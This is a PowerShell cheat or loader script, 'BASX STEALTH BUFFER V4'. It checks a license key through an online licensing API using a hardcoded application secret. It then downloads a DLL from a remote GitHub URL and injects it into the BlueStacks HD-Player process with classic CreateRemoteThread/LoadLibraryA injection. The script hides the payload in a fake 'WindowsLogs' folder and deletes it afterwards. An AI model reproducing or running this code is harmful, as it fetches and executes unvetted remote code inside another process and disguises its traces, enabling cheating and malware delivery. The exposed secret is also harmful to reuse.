[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- App Config ---
$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"
$dllUrl  = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/winsky.dll"
$target  = "HD-Player"

function Show-Auth {
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX STEALTH BUFFER V4    " -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        $key = Read-Host " Enter License Key"
        $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
        $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$($initRes.sessionid)&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        return $loginRes.success -eq $true
    } catch { return $false }
}

if (Show-Auth) {
    Write-Host "[+] Authentication Verified." -ForegroundColor Green

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Net;
    using System.Text;
    using System.IO;

    public class BufferNode {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(uint acc, bool inh, int pid);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);

        public static bool BufferInject(string url, int pid) {
            try {
                WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                byte[] dllData = wc.DownloadData(url);

                // Open with high-level access
                IntPtr hProc = OpenProcess(0x1F0FFF, false, pid);
                if (hProc == IntPtr.Zero) return false;

                // Create a masked path in a system-trusted folder
                string bDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "WindowsLogs");
                if (!Directory.Exists(bDir)) Directory.CreateDirectory(bDir);
                string bPath = Path.Combine(bDir, "lib_" + Guid.NewGuid().ToString().Substring(0,8) + ".tmp");
                File.WriteAllBytes(bPath, dllData);

                // Allocate and Write
                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)bPath.Length + 1, 0x3000, 0x40);
                IntPtr written;
                WriteProcessMemory(hProc, alloc, Encoding.Default.GetBytes(bPath), (uint)bPath.Length + 1, out written);

                // Execute LoadLibrary
                IntPtr hKern = GetModuleHandle("kernel32.dll");
                IntPtr hLoad = GetProcAddress(hKern, "LoadLibraryA");
                IntPtr hThrd = CreateRemoteThread(hProc, IntPtr.Zero, 0, hLoad, alloc, 0, IntPtr.Zero);

                if (hThrd != IntPtr.Zero) {
                    System.Threading.Thread.Sleep(5000);
                    if (File.Exists(bPath)) File.Delete(bPath);
                    return true;
                }
            } catch { }
            return false;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    }
"@
    Add-Type -TypeDefinition $Source

    Write-Host "[*] Status: Searching for $target..." -ForegroundColor Cyan
    while ($true) {
        $p = Get-Process $target -ErrorAction SilentlyContinue
        if ($p) {
            Write-Host "[!] Target found. Attempting Buffer Injection..." -ForegroundColor Yellow
            if ([BufferNode]::BufferInject($dllUrl, $p.Id)) {
                Write-Host "[+] Injection Success! Component mapped to $target." -ForegroundColor Green
                break
            } else {
                Write-Host "[-] Access Denied. Still blocked by Emulator security." -ForegroundColor Red
                Start-Sleep -Seconds 5
            }
        }
        Start-Sleep -Seconds 3
    }
}
